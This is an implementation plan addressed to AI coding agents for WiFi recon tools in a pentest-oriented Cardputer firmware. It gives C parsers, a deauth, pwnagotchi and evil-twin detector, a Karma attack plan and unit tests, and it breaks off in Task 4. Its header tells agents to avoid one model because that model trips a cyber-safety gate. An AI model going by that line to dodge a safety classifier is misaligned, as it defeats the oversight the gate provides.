# Part A — Recon / Utility Feature Pack Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking. Each task: write failing test → run it (fails) → implement → run (passes) → firmware build → commit.
> **Model policy:** opus/haiku only. Do NOT use Sonnet for any step (it trips the cyber-safety gate on this offensive-security codebase), consistent with the sibling `2026-07-11-network-lan-suite.md` plan.

**Spec:** `docs/superpowers/specs/2026-07-11-evil-porkchop-halehound-feature-pack-design.md` (Part A only — Features 1–6).

**Goal:** Ship Part A of the Evil-M5/Porkchop/HaleHound feature pack — six recon/utility tools for the authorized-pentest Cardputer-ADV Flipper port: WiFi Spectrum Waterfall, standalone Karma attack, Attack Detector, Probe/PNL Sniffer, unified Loot Browser (all in `wlan_app`), and a standalone Charging/Battery `power_monitor` app.

**Architecture:**
- **Pure-logic first (TDD).** Each feature's parsing/aggregation/math is isolated into a dependency-free C module (only `<stdint.h> <stdbool.h> <string.h> <stdio.h>`) that host-tests `#include` directly and compile with WSL gcc — exactly the pattern of `applications/main/subghz/helpers/protoview_ring.c` + `tests/test_protoview_ring.c`.
- **Scenes + views on top.** WiFi tools are new scenes in `applications/main/wlan_app/`, each registered via `scenes/scene_config.h` (`ADD_SCENE`) with handlers auto-declared in `scenes.h`. Custom canvas views follow the `wlan_pmkid_view.c` model (a `View` + locking model + draw callback); Karma reuses the existing `wlan_sniffer_view`.
- **RX-callback discipline.** Promiscuous callbacks only bump volatile counters / copy a few bytes; all parsing + aggregation happens on the 250 ms scene tick, mirroring `scene_package_sniffer.c`.
- **One new menu.** The `wlan_app` main menu gains a single "Recon+ ▶" item routing to a new `WlanAppSceneReconMenu` submenu that lists the WiFi-side tools; the Power app is a separate desktop app under the "Tools" loader category.

**Tech Stack:** ESP-IDF v5.4.1 (ESP32-S3, no PSRAM), C, Flipper firmware app framework (scene manager + view dispatcher). Host unit tests: WSL `gcc` (Debian 15.2, verified available). Board: `m5stack_cardputer_adv`.

## Global Constraints

- **No PSRAM.** All new buffers are bounded, static, and small (waterfall ring 40×13 bytes, SSID set cap 32, MAC table cap 24, power curve 96 bytes). No large heap allocations, and NONE inside RX callbacks.
- **Single shared radio.** WiFi promiscuous tools reuse the existing teardown path: on scene enter call `wlan_hal_start()` if `!wlan_hal_is_started()`, and `wlan_hal_disconnect()` if `wlan_hal_is_connected()`. Only one WiFi tool runs at a time (scene-scoped start/stop). Stop promiscuous (`wlan_hal_set_promiscuous(false, NULL)`) on scene exit.
- **802.11 TX ≤ 64 B** for `wlan_hal_send_raw`; Karma beacons use `esp_wifi_80211_tx` via the existing beacon builder (template is 107 B) — reuse the HAL beacon path, do not route beacons through `wlan_hal_send_raw`.
- **Pure modules must NOT include** `furi.h`, `esp_*.h`, or `gui/*` — only `<stdint.h> <stdbool.h> <string.h> <stdio.h>`. This is what lets the `.c` compile on the host. They live inside app dirs and are auto-globbed into the firmware build (no CMake edits needed).
- **Firmware build** (synchronous, never backgrounded, timeout 600000 ms), run from Git Bash at repo root:
  ```
  MSYS_NO_PATHCONV=1 cmd.exe /c "C:\Users\stone\Downloads\_fzcard_work\Flipper-Zero-meets-M5Stack-Cardputer-1.15\build_ci.bat" > build_<tag>.log 2>&1; echo "EXIT=$?"
  ```
  Success = log contains `Project build complete` **and** `=== BUILD OK ===`, and `EXIT=0`.
- **Host test** (run from Git Bash at repo root; `$REPO` = the absolute repo path):
  ```
  wsl.exe -- bash -lc "cd '/mnt/c/Users/stone/Downloads/_fzcard_work/Flipper-Zero-meets-M5Stack-Cardputer-1.15' && gcc -Wall -Wextra -o /tmp/t tests/<test>.c && /tmp/t"
  ```
  (Pure test `.c` files `#include` the module `.c` by relative path, so only the test file is passed to gcc — mirrors `tests/test_protoview_ring.c`.)
- **Commits:** the harness reports this is not a git repo. Attempt `git add … && git commit` per task; if `git` errors, skip the commit and note it in the task output. Never block on git.
- **Menu-order / enum rule:** append new `ADD_SCENE(...)` lines to the END of `scene_config.h` and new `WlanAppView*` enumerators just BEFORE the closing `}` of the `WlanAppView` enum in `wlan_app.h`. Order matters only in that handler arrays and view registrations must stay consistent — always append, never insert.

---

## Task 1 — Pure module: probe-request SSID-IE parser + bounded SSID set (shared)

Shared by Karma (Task 8), Probe Sniffer (Task 10), and Attack Detector's pwnagotchi/SSID checks (Task 9).

**Files:**
- Create: `applications/main/wlan_app/wlan_probe_parse.h`
- Create: `applications/main/wlan_app/wlan_probe_parse.c`
- Test: `tests/test_wlan_probe_parse.c`

**Interfaces:**
- Consumes: nothing.
- Produces:
  ```c
  #define WLAN_PROBE_SSID_MAX 33          // 32 SSID bytes + NUL
  // Extract SSID + transmitter (addr2) MAC from a raw 802.11 probe-request frame.
  // Returns false unless the frame is a mgmt probe-request (FC type=00, subtype=0100)
  // and long enough. out_ssid is always NUL-terminated ("" for a wildcard probe).
  bool wlan_probe_extract(const uint8_t* frame, uint16_t len,
                          char out_ssid[WLAN_PROBE_SSID_MAX], uint8_t out_mac[6]);
  // Grab the SSID IE (tag 0) out of a beacon/probe-response body starting at
  // fixed_params_offset (24 for probe-req, 36 for beacon). Returns false if absent.
  bool wlan_probe_ssid_ie(const uint8_t* frame, uint16_t len, uint16_t tag_offset,
                          char out_ssid[WLAN_PROBE_SSID_MAX]);
  #define WLAN_SSID_SET_CAP 32
  typedef struct {
      char ssids[WLAN_SSID_SET_CAP][WLAN_PROBE_SSID_MAX];
      uint8_t count;
  } WlanSsidSet;
  void wlan_ssid_set_reset(WlanSsidSet* s);
  // Insert if non-empty, not already present, and room remains. Returns true if newly added.
  bool wlan_ssid_set_insert(WlanSsidSet* s, const char* ssid);
  ```

- [ ] **Step 1: Write the failing test** — `tests/test_wlan_probe_parse.c`

```c
#include "../applications/main/wlan_app/wlan_probe_parse.c"
#include <assert.h>
#include <stdio.h>

// Build a minimal probe-request: FC=0x40,0x00; dur; addr1(bcast); addr2(client);
// addr3(bcast); seq; then SSID IE (tag 0, len, bytes).
static uint16_t mk_probe(uint8_t* b, const uint8_t mac[6], const char* ssid) {
    uint16_t n = 0;
    b[n++] = 0x40; b[n++] = 0x00;              // frame control: mgmt probe-req
    b[n++] = 0x00; b[n++] = 0x00;              // duration
    for (int i = 0; i < 6; i++) b[n++] = 0xFF; // addr1
    for (int i = 0; i < 6; i++) b[n++] = mac[i]; // addr2 (client)
    for (int i = 0; i < 6; i++) b[n++] = 0xFF; // addr3
    b[n++] = 0x00; b[n++] = 0x00;              // seq ctl (offset 22..23)
    uint8_t sl = (uint8_t)strlen(ssid);        // tagged params @ offset 24
    b[n++] = 0x00; b[n++] = sl;
    for (uint8_t i = 0; i < sl; i++) b[n++] = (uint8_t)ssid[i];
    return n;
}

int main(void) {
    uint8_t buf[128];
    uint8_t mac[6] = {0xAA,0xBB,0xCC,0x11,0x22,0x33};
    char ssid[WLAN_PROBE_SSID_MAX];
    uint8_t got[6];

    uint16_t len = mk_probe(buf, mac, "HomeNet");
    assert(wlan_probe_extract(buf, len, ssid, got));
    assert(strcmp(ssid, "HomeNet") == 0);
    assert(memcmp(got, mac, 6) == 0);

    // Wildcard probe (SSID len 0) → empty string, still true.
    len = mk_probe(buf, mac, "");
    assert(wlan_probe_extract(buf, len, ssid, got));
    assert(ssid[0] == '\0');

    // Not a probe-request (beacon FC 0x80) → false.
    buf[0] = 0x80;
    assert(!wlan_probe_extract(buf, len, ssid, got));

    // Too short → false.
    assert(!wlan_probe_extract(buf, 10, ssid, got));

    // SSID set: dedup + bounded + skips empty.
    WlanSsidSet set;
    wlan_ssid_set_reset(&set);
    assert(wlan_ssid_set_insert(&set, "A"));
    assert(!wlan_ssid_set_insert(&set, "A"));   // dup
    assert(!wlan_ssid_set_insert(&set, ""));     // empty skipped
    assert(wlan_ssid_set_insert(&set, "B"));
    assert(set.count == 2);
    char name[8];
    for (int i = 0; i < WLAN_SSID_SET_CAP + 5; i++) {
        snprintf(name, sizeof(name), "s%d", i);
        wlan_ssid_set_insert(&set, name);
    }
    assert(set.count == WLAN_SSID_SET_CAP);      // never overflows

    printf("test_wlan_probe_parse OK\n");
    return 0;
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `wsl.exe -- bash -lc "cd '/mnt/c/Users/stone/Downloads/_fzcard_work/Flipper-Zero-meets-M5Stack-Cardputer-1.15' && gcc -Wall -Wextra -o /tmp/t tests/test_wlan_probe_parse.c && /tmp/t"`
Expected: FAIL — `wlan_probe_parse.c: No such file` (module not created yet).

- [ ] **Step 3: Write the header** — `applications/main/wlan_app/wlan_probe_parse.h`

```c
#pragma once
#include <stdint.h>
#include <stdbool.h>
#include <string.h>

#define WLAN_PROBE_SSID_MAX 33

bool wlan_probe_extract(const uint8_t* frame, uint16_t len,
                        char out_ssid[WLAN_PROBE_SSID_MAX], uint8_t out_mac[6]);
bool wlan_probe_ssid_ie(const uint8_t* frame, uint16_t len, uint16_t tag_offset,
                        char out_ssid[WLAN_PROBE_SSID_MAX]);

#define WLAN_SSID_SET_CAP 32
typedef struct {
    char ssids[WLAN_SSID_SET_CAP][WLAN_PROBE_SSID_MAX];
    uint8_t count;
} WlanSsidSet;

void wlan_ssid_set_reset(WlanSsidSet* s);
bool wlan_ssid_set_insert(WlanSsidSet* s, const char* ssid);
```

- [ ] **Step 4: Write the implementation** — `applications/main/wlan_app/wlan_probe_parse.c`

```c
#include "wlan_probe_parse.h"

bool wlan_probe_ssid_ie(const uint8_t* frame, uint16_t len, uint16_t tag_offset,
                        char out_ssid[WLAN_PROBE_SSID_MAX]) {
    out_ssid[0] = '\0';
    if(!frame || len < tag_offset) return false;
    uint16_t i = tag_offset;
    while(i + 2 <= len) {
        uint8_t tag = frame[i];
        uint8_t tlen = frame[i + 1];
        if(i + 2 + tlen > len) return false; // malformed IE
        if(tag == 0x00) { // SSID IE
            uint8_t n = tlen > 32 ? 32 : tlen;
            memcpy(out_ssid, &frame[i + 2], n);
            out_ssid[n] = '\0';
            return true;
        }
        i += 2 + tlen;
    }
    return false;
}

bool wlan_probe_extract(const uint8_t* frame, uint16_t len,
                        char out_ssid[WLAN_PROBE_SSID_MAX], uint8_t out_mac[6]) {
    out_ssid[0] = '\0';
    if(!frame || len < 24) return false;
    // Frame control byte0: version(2) | type(2)<<2 | subtype(4)<<4.
    // Probe-request: type=00 (mgmt), subtype=0100 → 0x40.
    if((frame[0] & 0x0C) != 0x00) return false;  // must be mgmt
    if((frame[0] & 0xF0) != 0x40) return false;  // must be subtype 4
    memcpy(out_mac, &frame[10], 6);              // addr2 = transmitter
    // Tagged params begin at offset 24 for a probe-request. SSID absent = wildcard.
    wlan_probe_ssid_ie(frame, len, 24, out_ssid); // leaves "" if none
    return true;
}

void wlan_ssid_set_reset(WlanSsidSet* s) {
    s->count = 0;
}

bool wlan_ssid_set_insert(WlanSsidSet* s, const char* ssid) {
    if(!ssid || ssid[0] == '\0') return false;
    for(uint8_t i = 0; i < s->count; i++) {
        if(strncmp(s->ssids[i], ssid, WLAN_PROBE_SSID_MAX - 1) == 0) return false;
    }
    if(s->count >= WLAN_SSID_SET_CAP) return false;
    strncpy(s->ssids[s->count], ssid, WLAN_PROBE_SSID_MAX - 1);
    s->ssids[s->count][WLAN_PROBE_SSID_MAX - 1] = '\0';
    s->count++;
    return true;
}
```

- [ ] **Step 5: Run test to verify it passes**

Run: `wsl.exe -- bash -lc "cd '/mnt/c/Users/stone/Downloads/_fzcard_work/Flipper-Zero-meets-M5Stack-Cardputer-1.15' && gcc -Wall -Wextra -o /tmp/t tests/test_wlan_probe_parse.c && /tmp/t"`
Expected: PASS — `test_wlan_probe_parse OK`.

- [ ] **Step 6: Commit**

```bash
git add applications/main/wlan_app/wlan_probe_parse.h applications/main/wlan_app/wlan_probe_parse.c tests/test_wlan_probe_parse.c
git commit -m "feat(wlan): probe-request SSID-IE parser + bounded SSID set (host-tested)"
```

---

## Task 2 — Pure module: bounded MAC→SSID table (LRU) for Probe Sniffer

**Files:**
- Create: `applications/main/wlan_app/wlan_probe_table.h`
- Create: `applications/main/wlan_app/wlan_probe_table.c`
- Test: `tests/test_wlan_probe_table.c`

**Interfaces:**
- Consumes: `wlan_probe_parse.h` (`WlanSsidSet`, `WLAN_PROBE_SSID_MAX`).
- Produces:
  ```c
  #define WLAN_PT_CAP 24        // tracked clients (LRU-evicted)
  #define WLAN_PT_SSID_PER 4    // recent probed SSIDs kept per client
  typedef struct {
      uint8_t mac[6];
      char ssids[WLAN_PT_SSID_PER][WLAN_PROBE_SSID_MAX];
      uint8_t ssid_count;
      uint32_t seq;             // last-touched clock for LRU
      bool used;
  } WlanPtEntry;
  typedef struct {
      WlanPtEntry entries[WLAN_PT_CAP];
      uint32_t clock;
      uint16_t unique_clients;  // distinct MACs ever inserted this session
      WlanSsidSet all_ssids;    // distinct SSIDs ever probed (bounded 32)
  } WlanProbeTable;
  void wlan_probe_table_reset(WlanProbeTable* t);
  // Insert/update (mac, ssid). Empty ssid still registers the client. LRU-evicts.
  void wlan_probe_table_add(WlanProbeTable* t, const uint8_t mac[6], const char* ssid);
  uint16_t wlan_probe_table_client_count(const WlanProbeTable* t); // live entries
  uint16_t wlan_probe_table_ssid_count(const WlanProbeTable* t);   // t->all_ssids.count
  ```

- [ ] **Step 1: Write the failing test** — `tests/test_wlan_probe_table.c`

```c
#include "../applications/main/wlan_app/wlan_probe_parse.c"
#include "../applications/main/wlan_app/wlan_probe_table.c"
#include <assert.h>
#include <stdio.h>

static void mkmac(uint8_t m[6], uint8_t last) {
    m[0]=0x02; m[1]=0; m[2]=0; m[3]=0; m[4]=0; m[5]=last;
}

int main(void) {
    WlanProbeTable t;
    wlan_probe_table_reset(&t);
    assert(wlan_probe_table_client_count(&t) == 0);

    uint8_t a[6]; mkmac(a, 1);
    wlan_probe_table_add(&t, a, "Net1");
    wlan_probe_table_add(&t, a, "Net2");
    wlan_probe_table_add(&t, a, "Net1");        // dup ssid for same client
    assert(wlan_probe_table_client_count(&t) == 1);
    assert(t.entries_find_count_helper == 0 || 1); // (placeholder — see note)

    // one client, two distinct SSIDs
    assert(wlan_probe_table_ssid_count(&t) == 2);

    // fill past capacity → LRU eviction, count capped
    for (int i = 2; i < WLAN_PT_CAP + 10; i++) {
        uint8_t m[6]; mkmac(m, (uint8_t)i);
        wlan_probe_table_add(&t, m, "X");
    }
    assert(wlan_probe_table_client_count(&t) == WLAN_PT_CAP);

    // ssid set is bounded at 32 and never overflows
    assert(wlan_probe_table_ssid_count(&t) <= WLAN_SSID_SET_CAP);

    printf("test_wlan_probe_table OK\n");
    return 0;
}
```
> NOTE to implementer: delete the `entries_find_count_helper` placeholder assertion line — it exists only to remind you the table has no such field. Keep the rest.

- [ ] **Step 2: Run test to verify it fails**

Run: `wsl.exe -- bash -lc "cd '/mnt/c/Users/stone/Downloads/_fzcard_work/Flipper-Zero-meets-M5Stack-Cardputer-1.15' && gcc -Wall -Wextra -o /tmp/t tests/test_wlan_probe_table.c && /tmp/t"`
Expected: FAIL — `wlan_probe_table.c: No such file`.

- [ ] **Step 3: Write the header** — `applications/main/wlan_app/wlan_probe_table.h`

```c
#pragma once
#include "wlan_probe_parse.h"

#define WLAN_PT_CAP 24
#define WLAN_PT_SSID_PER 4

typedef struct {
    uint8_t mac[6];
    char ssids[WLAN_PT_SSID_PER][WLAN_PROBE_SSID_MAX];
    uint8_t ssid_count;
    uint32_t seq;
    bool used;
} WlanPtEntry;

typedef struct {
    WlanPtEntry entries[WLAN_PT_CAP];
    uint32_t clock;
    uint16_t unique_clients;
    WlanSsidSet all_ssids;
} WlanProbeTable;

void wlan_probe_table_reset(WlanProbeTable* t);
void wlan_probe_table_add(WlanProbeTable* t, const uint8_t mac[6], const char* ssid);
uint16_t wlan_probe_table_client_count(const WlanProbeTable* t);
uint16_t wlan_probe_table_ssid_count(const WlanProbeTable* t);
```

- [ ] **Step 4: Write the implementation** — `applications/main/wlan_app/wlan_probe_table.c`

```c
#include "wlan_probe_table.h"

void wlan_probe_table_reset(WlanProbeTable* t) {
    memset(t, 0, sizeof(*t));
    wlan_ssid_set_reset(&t->all_ssids);
}

static WlanPtEntry* pt_find(WlanProbeTable* t, const uint8_t mac[6]) {
    for(uint8_t i = 0; i < WLAN_PT_CAP; i++) {
        if(t->entries[i].used && memcmp(t->entries[i].mac, mac, 6) == 0) {
            return &t->entries[i];
        }
    }
    return NULL;
}

static WlanPtEntry* pt_alloc(WlanProbeTable* t, const uint8_t mac[6]) {
    // First free slot, else LRU (lowest seq).
    WlanPtEntry* victim = NULL;
    for(uint8_t i = 0; i < WLAN_PT_CAP; i++) {
        if(!t->entries[i].used) { victim = &t->entries[i]; break; }
        if(!victim || t->entries[i].seq < victim->seq) victim = &t->entries[i];
    }
    memset(victim, 0, sizeof(*victim));
    memcpy(victim->mac, mac, 6);
    victim->used = true;
    return victim;
}

static void pt_add_ssid(WlanPtEntry* e, const char* ssid) {
    if(!ssid || ssid[0] == '\0') return;
    for(uint8_t i = 0; i < e->ssid_count; i++) {
        if(strncmp(e->ssids[i], ssid, WLAN_PROBE_SSID_MAX - 1) == 0) return;
    }
    if(e->ssid_count < WLAN_PT_SSID_PER) {
        strncpy(e->ssids[e->ssid_count], ssid, WLAN_PROBE_SSID_MAX - 1);
        e->ssids[e->ssid_count][WLAN_PROBE_SSID_MAX - 1] = '\0';
        e->ssid_count++;
    } else {
        // shift out oldest, append newest
        for(uint8_t i = 1; i < WLAN_PT_SSID_PER; i++) {
            memcpy(e->ssids[i - 1], e->ssids[i], WLAN_PROBE_SSID_MAX);
        }
        strncpy(e->ssids[WLAN_PT_SSID_PER - 1], ssid, WLAN_PROBE_SSID_MAX - 1);
        e->ssids[WLAN_PT_SSID_PER - 1][WLAN_PROBE_SSID_MAX - 1] = '\0';
    }
}

void wlan_probe_table_add(WlanProbeTable* t, const uint8_t mac[6], const char* ssid) {
    WlanPtEntry* e = pt_find(t, mac);
    if(!e) {
        e = pt_alloc(t, mac);
        t->unique_clients++;
    }
    e->seq = ++t->clock;
    pt_add_ssid(e, ssid);
    wlan_ssid_set_insert(&t->all_ssids, ssid);
}

uint16_t wlan_probe_table_client_count(const WlanProbeTable* t) {
    uint16_t n = 0;
    for(uint8_t i = 0; i < WLAN_PT_CAP; i++) if(t->entries[i].used) n++;
    return n;
}

uint16_t wlan_probe_table_ssid_count(const WlanProbeTable* t) {
    return t->all_ssids.count;
}
```

- [ ] **Step 5: Run test to verify it passes**

Run: `wsl.exe -- bash -lc "cd '/mnt/c/Users/stone/Downloads/_fzcard_work/Flipper-Zero-meets-M5Stack-Cardputer-1.15' && gcc -Wall -Wextra -o /tmp/t tests/test_wlan_probe_table.c && /tmp/t"`
Expected: PASS — `test_wlan_probe_table OK`.

- [ ] **Step 6: Commit**

```bash
git add applications/main/wlan_app/wlan_probe_table.h applications/main/wlan_app/wlan_probe_table.c tests/test_wlan_probe_table.c
git commit -m "feat(wlan): bounded LRU MAC->SSID probe table (host-tested)"
```

---

## Task 3 — Pure module: attack-frame classifier + evil-twin tracker

**Files:**
- Create: `applications/main/wlan_app/wlan_attack_detect.h`
- Create: `applications/main/wlan_app/wlan_attack_detect.c`
- Test: `tests/test_wlan_attack_detect.c`

**Interfaces:**
- Consumes: `wlan_probe_parse.h` (`wlan_probe_ssid_ie`, `WLAN_PROBE_SSID_MAX`).
- Produces:
  ```c
  typedef enum {
      WlanAlertNone = 0,
      WlanAlertDeauth,       // deauth (subtype 0x0C) or disassoc (subtype 0x0A)
      WlanAlertPwnagotchi,   // beacon whose SSID payload looks like pwnagotchi JSON
  } WlanAlertType;
  // Classify a single raw 802.11 mgmt frame. Also copies the transmitter (addr2)
  // into out_src[6] when the return is non-None (out_src may be NULL to skip).
  WlanAlertType wlan_attack_classify(const uint8_t* frame, uint16_t len, uint8_t out_src[6]);

  #define WLAN_ET_CAP 16
  typedef struct { char ssid[WLAN_PROBE_SSID_MAX]; uint8_t bssid[6]; bool used; } WlanEtEntry;
  typedef struct { WlanEtEntry e[WLAN_ET_CAP]; } WlanEvilTwinTracker;
  void wlan_evil_twin_reset(WlanEvilTwinTracker* t);
  // Observe a (ssid, bssid) beacon. Returns true the first time a known SSID is
  // seen under a DIFFERENT bssid (evil twin). New SSIDs are just recorded.
  bool wlan_evil_twin_observe(WlanEvilTwinTracker* t, const char* ssid, const uint8_t bssid[6]);
  ```

- [ ] **Step 1: Write the failing test** — `tests/test_wlan_attack_detect.c`

```c
#include "../applications/main/wlan_app/wlan_probe_parse.c"
#include "../applications/main/wlan_app/wlan_attack_detect.c"
#include <assert.h>
#include <stdio.h>

// 24-byte mgmt header with given FC subtype byte + addr2.
static uint16_t mk_mgmt(uint8_t* b, uint8_t fc0, const uint8_t src[6]) {
    memset(b, 0, 24);
    b[0] = fc0;
    for (int i = 0; i < 6; i++) b[10 + i] = src[i]; // addr2
    return 24;
}

// beacon (fc0=0x80): 24 hdr + 12 fixed (ts/interval/cap) + SSID IE @36.
static uint16_t mk_beacon(uint8_t* b, const uint8_t bssid[6], const char* ssid) {
    memset(b, 0, 36);
    b[0] = 0x80;
    for (int i = 0; i < 6; i++) { b[10+i] = bssid[i]; b[16+i] = bssid[i]; }
    uint16_t n = 36;
    uint8_t sl = (uint8_t)strlen(ssid);
    b[n++] = 0x00; b[n++] = sl;
    for (uint8_t i = 0; i < sl; i++) b[n++] = (uint8_t)ssid[i];
    return n;
}

int main(void) {
    uint8_t buf[128], src[6] = {1,2,3,4,5,6}, got[6];

    assert(wlan_attack_classify(buf, mk_mgmt(buf, 0xC0, src), got) == WlanAlertDeauth);
    assert(memcmp(got, src, 6) == 0);
    assert(wlan_attack_classify(buf, mk_mgmt(buf, 0xA0, src), NULL) == WlanAlertDeauth); // disassoc
    assert(wlan_attack_classify(buf, mk_mgmt(buf, 0x40, src), NULL) == WlanAlertNone);   // probe-req

    uint8_t bss[6] = {0xDE,0xAD,0,0,0,1};
    assert(wlan_attack_classify(buf, mk_beacon(buf, bss, "{\"name\":\"pwn\""), NULL)
           == WlanAlertPwnagotchi);
    assert(wlan_attack_classify(buf, mk_beacon(buf, bss, "NormalNet"), NULL)
           == WlanAlertNone);

    // Evil-twin tracker
    WlanEvilTwinTracker et; wlan_evil_twin_reset(&et);
    uint8_t b1[6] = {1,1,1,1,1,1}, b2[6] = {2,2,2,2,2,2};
    assert(!wlan_evil_twin_observe(&et, "Cafe", b1)); // first sighting
    assert(!wlan_evil_twin_observe(&et, "Cafe", b1)); // same bssid, fine
    assert(wlan_evil_twin_observe(&et, "Cafe", b2));   // different bssid → twin!
    assert(!wlan_evil_twin_observe(&et, "Other", b1)); // unrelated

    printf("test_wlan_attack_detect OK\n");
    return 0;
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `wsl.exe -- bash -lc "cd '/mnt/c/Users/stone/Downloads/_fzcard_work/Flipper-Zero-meets-M5Stack-Cardputer-1.15' && gcc -Wall -Wextra -o /tmp/t tests/test_wlan_attack_detect.c && /tmp/t"`
Expected: FAIL — `wlan_attack_detect.c: No such file`.

- [ ] **Step 3: Write the header** — `applications/main/wlan_app/wlan_attack_detect.h`

```c
#pragma once
#include "wlan_probe_parse.h"

typedef enum {
    WlanAlertNone = 0,
    WlanAlertDeauth,
    WlanAlertPwnagotchi,
} WlanAlertType;

WlanAlertType wlan_attack_classify(const uint8_t* frame, uint16_t len, uint8_t out_src[6]);

#define WLAN_ET_CAP 16
typedef struct { char ssid[WLAN_PROBE_SSID_MAX]; uint8_t bssid[6]; bool used; } WlanEtEntry;
typedef struct { WlanEtEntry e[WLAN_ET_CAP]; } WlanEvilTwinTracker;
void wlan_evil_twin_reset(WlanEvilTwinTracker* t);
bool wlan_evil_twin_observe(WlanEvilTwinTracker* t, const char* ssid, const uint8_t bssid[6]);
```

- [ ] **Step 4: Write the implementation** — `applications/main/wlan_app/wlan_attack_detect.c`

```c
#include "wlan_attack_detect.h"

WlanAlertType wlan_attack_classify(const uint8_t* frame, uint16_t len, uint8_t out_src[6]) {
    if(!frame || len < 24) return WlanAlertNone;
    if((frame[0] & 0x0C) != 0x00) return WlanAlertNone; // mgmt only
    uint8_t subtype = frame[0] & 0xF0;
    if(out_src) memcpy(out_src, &frame[10], 6);
    if(subtype == 0xC0 || subtype == 0xA0) return WlanAlertDeauth; // deauth / disassoc
    if(subtype == 0x80) { // beacon → pwnagotchi heuristic
        char ssid[WLAN_PROBE_SSID_MAX];
        if(wlan_probe_ssid_ie(frame, len, 36, ssid)) {
            if(ssid[0] == '{' && ssid[1] == '"') return WlanAlertPwnagotchi;
        }
    }
    if(out_src) memset(out_src, 0, 6);
    return WlanAlertNone;
}

void wlan_evil_twin_reset(WlanEvilTwinTracker* t) {
    memset(t, 0, sizeof(*t));
}

bool wlan_evil_twin_observe(WlanEvilTwinTracker* t, const char* ssid, const uint8_t bssid[6]) {
    if(!ssid || ssid[0] == '\0') return false;
    WlanEtEntry* free_slot = NULL;
    for(uint8_t i = 0; i < WLAN_ET_CAP; i++) {
        WlanEtEntry* e = &t->e[i];
        if(!e->used) { if(!free_slot) free_slot = e; continue; }
        if(strncmp(e->ssid, ssid, WLAN_PROBE_SSID_MAX - 1) == 0) {
            return memcmp(e->bssid, bssid, 6) != 0; // same ssid, different bssid = twin
        }
    }
    if(free_slot) { // record first sighting (bounded; extra SSIDs ignored once full)
        strncpy(free_slot->ssid, ssid, WLAN_PROBE_SSID_MAX - 1);
        free_slot->ssid[WLAN_PROBE_SSID_MAX - 1] = '\0';
        memcpy(free_slot->bssid, bssid, 6);
        free_slot->used = true;
    }
    return false;
}
```

- [ ] **Step 5: Run test to verify it passes**

Run: `wsl.exe -- bash -lc "cd '/mnt/c/Users/stone/Downloads/_fzcard_work/Flipper-Zero-meets-M5Stack-Cardputer-1.15' && gcc -Wall -Wextra -o /tmp/t tests/test_wlan_attack_detect.c && /tmp/t"`
Expected: PASS — `test_wlan_attack_detect OK`.

- [ ] **Step 6: Commit**

```bash
git add applications/main/wlan_app/wlan_attack_detect.h applications/main/wlan_app/wlan_attack_detect.c tests/test_wlan_attack_detect.c
git commit -m "feat(wlan): attack-frame classifier + evil-twin tracker (host-tested)"
```

---

## Task 4 — Pure module: spectrum waterfall aggregator

**Files:**
- Create: `applications/main/wlan_app/wlan_spectrum.h`
- Create: `applications/main/wlan_app/wlan_spectrum.c`
- Test: `tests/test_wlan_spectrum.c`

**Interfaces:**
- Consumes: nothing.
- Produces:
  ```c
  #define SPEC_CHANNELS 13
  #define SPEC_ROWS 40
  typedef struct {
      uint16_t cur_count[SPEC_CHANNELS]; // frames seen this sweep, per channel
      int8_t   cur_peak[SPEC_CHANNELS];  // peak RSSI this sweep (-128 = none)
      uint8_t  rows[SPEC_ROWS][SPEC_CHANNELS]; // waterfall ring, intensity 0..15
      uint8_t  head;   // next write row index
      uint8_t  filled; // valid rows (<= SPEC_ROWS)
  } WlanSpectrum;
  void wlan_spectrum_reset(WlanSpectrum* s);
  // Record the dwell result for `channel` (1..13) into the in-progress sweep.
  void wlan_spectrum_set_dwell(WlanSpectrum* s, uint8_t channel,
                               uint16_t frame_count, int8_t peak_rssi);
  // Fold the 13 dwell cells into a new waterfall row, then clear the sweep.
  void wlan_spectrum_commit_sweep(WlanSpectrum* s);
  // Live bar level 0..15 for a channel from the in-progress sweep.
  uint8_t wlan_spectrum_live_level(const WlanSpectrum* s, uint8_t channel);
  // Waterfall cell 0..15; row_from_top 0 = newest committed row.
  uint8_t wlan_spectrum_cell(const WlanSpectrum* s, uint8_t row_from_top, uint8_t channel);
  ```

**Intensity mapping (deterministic, testable):**
`level(count, peak)`: `0` if `count==0`; else `base = 1 + min(count, 20)/2` (1..11) plus a peak bonus `+4` if `peak > -60`, `+2` if `peak > -80`, else `+0`; clamp to `15`.

- [ ] **Step 1: Write the failing test** — `tests/test_wlan_spectrum.c`

```c
#include "../applications/main/wlan_app/wlan_spectrum.c"
#include <assert.h>
#include <stdio.h>

int main(void) {
    WlanSpectrum s;
    wlan_spectrum_reset(&s);
    assert(s.filled == 0);
    assert(wlan_spectrum_live_level(&s, 1) == 0);

    // idle channel → 0; busy strong channel → high
    wlan_spectrum_set_dwell(&s, 1, 0, -128);
    wlan_spectrum_set_dwell(&s, 6, 40, -50);   // busy + strong
    assert(wlan_spectrum_live_level(&s, 1) == 0);
    uint8_t l6 = wlan_spectrum_live_level(&s, 6);
    assert(l6 > 10 && l6 <= 15);

    wlan_spectrum_commit_sweep(&s);
    assert(s.filled == 1);
    assert(wlan_spectrum_cell(&s, 0, 1) == 0);
    assert(wlan_spectrum_cell(&s, 0, 6) == l6);
    // sweep accumulators cleared after commit
    assert(wlan_spectrum_live_level(&s, 6) == 0);

    // ring wraps: push > SPEC_ROWS sweeps, newest stays at row 0, filled caps
    for (int i = 0; i < SPEC_ROWS + 10; i++) {
        wlan_spectrum_set_dwell(&s, 3, (uint16_t)(i % 20), -70);
        wlan_spectrum_commit_sweep(&s);
    }
    assert(s.filled == SPEC_ROWS);
    // out-of-range channel/row are safe (return 0)
    assert(wlan_spectrum_cell(&s, 200, 3) == 0);
    assert(wlan_spectrum_live_level(&s, 99) == 0);

    printf("test_wlan_spectrum OK\n");
    return 0;
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `wsl.exe -- bash -lc "cd '/mnt/c/Users/stone/Downloads/_fzcard_work/Flipper-Zero-meets-M5Stack-Cardputer-1.15' && gcc -Wall -Wextra -o /tmp/t tests/test_wlan_spectrum.c && /tmp/t"`
Expected: FAIL — `wlan_spectrum.c: No such file`.

- [ ] **Step 3: Write the header** — `applications/main/wlan_app/wlan_spectrum.h`

```c
#pragma once
#include <stdint.h>
#include <stdbool.h>
